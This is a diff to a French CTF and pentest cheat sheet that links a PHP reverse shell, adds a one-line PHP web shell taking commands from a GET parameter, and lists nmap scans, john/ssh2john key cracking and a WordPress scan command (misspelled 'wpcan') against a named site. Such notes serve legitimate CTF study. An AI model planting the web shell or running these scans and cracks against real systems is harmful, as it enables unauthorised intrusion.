@@ -5,6 +5,7 @@
 ## CTF
 
 - Reverse shell PHP --> [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+	- `<?php system($_GET["cmd"]) ?>`
 
 ### Tools
 
@@ -37,11 +38,12 @@ john zip.hashes`
 
 - Crack clé RSA SSH --> `ssh2john.py secretKey > id_rsa.hash \n john --wordlist=dict.txt id_rsa.hash`
 	
-## Nmap
+## Scan
 
 - Voir les ports ouverts --> `nmap -Pn 192.168.1.1`
-
 - Voir la version des services --> `nmap -sV 192.168.1.1`
+
+- Wordpress --> `wpcan --url www.mokoil.com`
 
 ## Directory
 
